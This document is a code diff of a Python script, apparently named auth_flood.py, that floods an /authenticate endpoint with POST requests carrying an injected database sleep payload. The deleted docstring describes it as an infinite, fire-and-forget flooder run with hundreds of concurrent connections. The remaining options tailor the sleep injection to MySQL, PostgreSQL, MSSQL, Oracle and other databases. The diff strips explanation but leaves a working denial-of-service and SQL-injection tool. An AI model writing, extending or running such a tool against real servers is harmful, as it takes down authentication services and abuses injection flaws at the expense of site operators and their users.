@@ -1,23 +1,5 @@
 #!/usr/bin/env python3
-"""Simplified infinite auth flooder.
-
-Continuously (until Ctrl+C) fires POST requests to /authenticate with an injected
-sleep payload (function('sleep',<n>)=0). Requests are fire-and-forget: the socket
-is closed right after sending without waiting for a response.
-
-Usage (runs until killed):
-    python auth_flood.py --concurrency 300 --sleep 10 --progress
-
-Key args:
-    --concurrency   Max simultaneous open connections
-    --sleep         Seconds for the DB sleep call
-    --interval      Delay between scheduling new requests (throttle)
-    --linger        Optional delay after write before closing (default 0)
-    --progress      Print per‑second counters (sent/errors)
-
-Stop with Ctrl+C (SIGINT).
-"""
-import asyncio, argparse, json, time, signal, sys, ssl
+import asyncio, argparse, json, signal, ssl
 from urllib.parse import urlparse, quote
 
 PAYLOAD_BASE = {
@@ -63,9 +45,6 @@ async def send_one(parsed, body_bytes, connect_timeout, write_timeout, linger, *
     ssl_ctx = None
     if scheme == "https":
         ssl_ctx = ssl.create_default_context()
-        # For self-signed dev envs you might disable verification:
-        # ssl_ctx.check_hostname = False
-        # ssl_ctx.verify_mode = ssl.CERT_NONE
     try:
         fut = asyncio.open_connection(host, port, ssl=ssl_ctx)
         reader, writer = await asyncio.wait_for(fut, timeout=connect_timeout)
@@ -146,7 +125,7 @@ async def run(args):
         finally:
             semaphore.release()
 
-    prod_task = asyncio.create_task(producer())
+    asyncio.create_task(producer())
 
     # Progress printer
     last = 0
@@ -172,7 +151,7 @@ def parse_args():
     ap.add_argument("--concurrency", type=int, default=200, help="Max simultaneous open connections")
     ap.add_argument("--interval", type=float, default=0.0, help="Delay between scheduling requests (seconds)")
     ap.add_argument("--sleep", type=int, default=10, help="DB sleep seconds inside injected payload (if supported by chosen DB)")
-    ap.add_argument("--db", choices=["mysql","mariadb","postgres","mssql","oracle","h2","hsqldb","derby","sqlite"], default="mysql", help="Target DB type to tailor sleep function (default: mysql)")
+    ap.add_argument("--db", choices=["mysql","mariadb","postgres","mssql","oracle","h2","hsqldb"], default="mysql", help="Target DB type to tailor sleep function (default: mysql)")
     ap.add_argument("--connect-timeout", type=float, default=3.0, help="TCP connect timeout")
     ap.add_argument("--write-timeout", type=float, default=3.0, help="Write/drain timeout")
     ap.add_argument("--linger", type=float, default=0.0, help="Optional delay after sending before closing")
